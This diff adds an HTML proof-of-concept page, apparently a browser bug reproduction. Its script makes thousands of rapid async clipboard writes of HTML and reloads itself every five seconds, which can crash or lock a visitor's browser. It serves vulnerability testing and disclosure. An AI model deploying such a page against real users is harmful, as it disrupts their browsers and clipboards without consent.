@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>proof-of-concept</title>
+</head>
+<body>
+	<textarea type="text" id="pad00" class="myHtml"></textarea>
+	<textarea type="text" id="p" class="myHtml"></textarea>
+	<textarea type="text" id="pad01" class="myHtml"></textarea>
+	<textarea type="text" id="pad02" class="myHtml"></textarea>
+	<textarea type="text" id="pad03" class="myHtml"></textarea>
+	<textarea type="text" id="pad04" class="myHtml"></textarea>
+	<textarea type="text" id="pad05" class="myHtml"></textarea>
+	<textarea type="text" id="pad06" class="myHtml"></textarea>
+
+	<script>
+		async function read(){
+			const items = await navigator.clipboard.read();
+			const text_blob = await items[0].getType("text/plain");
+			const text = await (new Response(text_blob)).text();
+			return text;
+		}
+		
+		async function copy(){
+				const test_html = hoge_html.value;
+				const blob_data = new Blob([test_html], {type: 'text/html'});
+				const clipboard_item_data = new ClipboardItem({'text/html' : blob_data});
+				await navigator.clipboard.write([clipboard_item_data]);
+		}
+
+		async function first(){
+				const test_html = plain_area.value;
+				const blob_data = new Blob([test_html], {type: 'text/plain'});
+				const clipboard_item_data = new ClipboardItem({'text/plain' : blob_data});
+				await navigator.clipboard.write([clipboard_item_data]);
+		}
+
+		var hoge_html = document.getElementById("pad00");
+		hoge_html.value = '';
+		var plain_area = document.getElementById("p");
+		plain_area.value = ''
+		first();
+		plain_area.focus();
+
+		for(let i=0; i<0xfff; ++i){
+			copy();
+		}
+
+		setTimeout(() => {
+			window.location.reload();
+		}, 5000);
+
+	</script>
+</body>
+</html>
